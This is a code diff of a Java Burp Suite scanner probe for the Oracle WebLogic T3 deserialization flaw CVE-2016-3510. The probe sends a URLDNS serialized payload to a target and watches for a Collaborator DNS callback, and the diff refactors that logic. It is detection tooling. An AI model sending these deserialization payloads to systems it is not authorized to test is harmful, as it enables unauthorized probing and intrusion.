@@ -1,52 +1,38 @@
 package probes;
 
 import burp.*;
+import payloads.URLDNS;
 
-import java.io.IOException;
 import java.net.Socket;
-import java.net.URL;
-import java.util.Base64;
 
 public class CVE_2016_3510 extends Probe {
 
     private static final String NAME = "CVE-2016-3510";
     private static final String SEVERITY = "High";
-    private static String detail = "WebLogic has a T3 protocol vulnerability!";
+    private static final String DESC = "Unspecified vulnerability in the Oracle WebLogic Server component in Oracle Fusion Middleware 10.3.6.0, 12.1.3.0, and 12.2.1.0 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to WLS Core Components, a different vulnerability than CVE-2016-3586.";
 
     @Override
     public IScanIssue check(IHttpRequestResponse requestResponse) {
-        URL target = Utilities.helpers.analyzeRequest(requestResponse).getUrl();
+        IHttpService service = requestResponse.getHttpService();
         String pollPayload = Utilities.collaborator.generatePayload(true);
-        boolean vulnerable = false;
-        String result = "";
         try {
-            Socket s = new Socket(target.getHost(), target.getPort());
+            Socket s = new Socket(service.getHost(), service.getPort());
             s.setSoTimeout(10);
-
             byte[] payload = URLDNS.getPayloadBytes("http://" + pollPayload, "marshall");
-            result = sendT3Payload(s, payload);
+            sendT3Payload(s, payload);
             s.close();
         } catch (Exception e) {
-            e.printStackTrace();
+            e.printStackTrace(Utilities.err);
         }
 
-        for (IBurpCollaboratorInteraction interaction : Utilities.collaborator.fetchCollaboratorInteractionsFor(pollPayload)) {
-            byte[] rawQuery = Base64.getDecoder().decode(interaction.getProperty("raw_query").getBytes());
-            if (rawQuery.length > 0) {
-                Utilities.out.println(new String(rawQuery));
-            }
+        String detail = Utilities.fetchInteraction(pollPayload);
 
-            detail = detail + "<br/>"
-                    + "Receive a " + interaction.getProperty("type")
-                    + " query from " + interaction.getProperty("client_ip")
-                    + " at " + interaction.getProperty("time_stamp");
-
-            vulnerable = true;
-        }
-
-//        return result.contains("org.apache.commons.collections.functors.InvokerTransformer") ? new WebLogicIssue(requestResponse, NAME, detail, SEVERITY) : null;
-        if (vulnerable) {
-            return new WebLogicIssue(requestResponse, NAME, detail, SEVERITY);
+        if (detail.length() > 0) {
+            return new WebLogicIssue(
+                    requestResponse,
+                    NAME,
+                    DESC + "<br/><br/>" + detail,
+                    SEVERITY);
         } else return null;
     }
 }
